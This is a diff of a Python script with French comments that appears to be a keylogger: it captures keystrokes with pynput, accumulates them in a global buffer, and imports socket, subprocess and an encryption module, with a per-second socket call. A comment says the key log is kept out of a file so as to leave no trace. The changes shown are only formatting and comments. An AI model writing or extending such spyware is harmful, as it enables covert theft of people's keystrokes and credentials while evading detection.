@@ -1,7 +1,7 @@
+## Bibliothèque importée
+
 import subprocess
-
 from env import *
-
 import argparse
 import socket
 import time
@@ -11,6 +11,7 @@ import re
 from pynput.keyboard import Listener
 from chiffrement import *
 
+# déclaration variable globale
 
 TXT_GLOB = ""
 
@@ -57,8 +58,8 @@ def parse(srt):
 
 def kpr(key):
     global TXT_GLOB
-    #with open("keylog.txt", "a") as f: ## pas de fichier ca laisse une trace c'est nul
-        #f.write(parse(str(key)))
+    # with open("keylog.txt", "a") as f: ## pas de fichier ca laisse une trace c'est nul
+    # f.write(parse(str(key)))
     TXT_GLOB += parse(str(key))
 
 
@@ -97,7 +98,7 @@ def chrono():
 
                 print(f"Secondes : {seconds}")
                 seconds += 1
-                scan_socket(arg.listen) ############ le probleme de merde !!!
+                scan_socket(arg.listen)  ############ le probleme de merde !!!
                 time.sleep(1)
 
                 if seconds % 10 == 0:
